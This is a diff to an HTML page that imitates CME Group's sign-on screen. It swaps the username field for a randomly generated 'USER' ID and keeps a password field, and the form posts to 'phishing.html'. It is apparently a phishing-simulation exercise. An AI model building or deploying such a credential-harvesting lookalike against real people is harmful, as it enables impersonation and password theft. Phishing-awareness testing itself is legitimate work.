@@ -96,10 +96,14 @@
         
 <div class="login-container">
     <img src="logo.png" alt="CME Group Logo">
+    
     <h2 style="text-align: center;">Sign On</h2>
+    
     <form action="phishing.html" method="POST">
         <label for="email">Username</label>
-        <input type="text" id="email" name="email" required>
+        <!--<input type="text" id="email" name="email" required>-->
+
+        <p id="user-id"></p> <!-- Placeholder for random user ID -->
 
         <label for="password">Password</label>
         <input type="password" id="password" name="password" required>
@@ -127,6 +131,17 @@
         <p>By logging in you agree to our <a href="#">Terms of Use</a></p>
     </div>-->
 </div>
+
+<script>
+    // JavaScript to generate random user ID
+    function generateRandomUserId() {
+        const randomNum = Math.floor(Math.random() * 100); // Random number between 0 and 99
+        return 'USER' + randomNum; // Concatenate with 'USER'
+    }
+
+    // Set the random user ID in the paragraph
+    document.getElementById('user-id').textContent = generateRandomUserId();
+</script>
 
 <!--<div class="footer">
     <p>&copy; 2024 CME Group Inc. | <a href="#">Disclaimer</a> | <a href="#">Privacy Notice</a> | <a href="#">Supported Browsers</a></p>
